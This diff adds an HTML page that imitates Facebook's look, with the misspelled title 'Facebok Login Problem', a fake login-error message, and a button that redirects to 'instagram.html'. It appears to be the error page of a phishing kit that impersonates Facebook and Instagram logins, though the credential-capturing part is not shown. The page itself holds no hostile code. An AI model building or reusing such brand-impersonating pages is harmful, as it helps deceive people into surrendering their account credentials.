@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebok Login Problem</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            touch-action: manipulation;
+        }
+
+        .container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 40px;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        .logo h1 {
+            color: #1877f2;
+            font-size: 42px;
+            font-weight: bold;
+        }
+
+        .title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #1c1e21;
+        }
+
+        .message {
+            font-size: 15px;
+            color: #606770;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .back-button {
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            border: none;
+            font-size: 17px;
+            background-color: #1877f2;
+            color: white;
+            display: inline-block;
+        }
+
+        .back-button:hover {
+            background-color: #166fe5;
+        }
+
+        /* Mobile Responsive Styles */
+        @media (max-width: 450px) {
+            .container {
+                padding: 30px 20px;
+                box-shadow: none;
+                background-color: transparent;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>facebook</h1>
+        </div>
+        <div class="title">Login Problem</div>
+        <div class="message">
+            There was a problem with your Facebok login. Please try again later.
+        </div>
+        <button class="back-button" onclick="window.location.href='instagram.html'">Back to Login</button>
+    </div>
+
+    <script>
+        // Disable zooming
+        document.addEventListener('gesturestart', function(e) {
+            e.preventDefault();
+        });
+        
+        document.addEventListener('touchmove', function(e) {
+            if (e.scale !== 1) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+    </script>
+</body>
+</html>
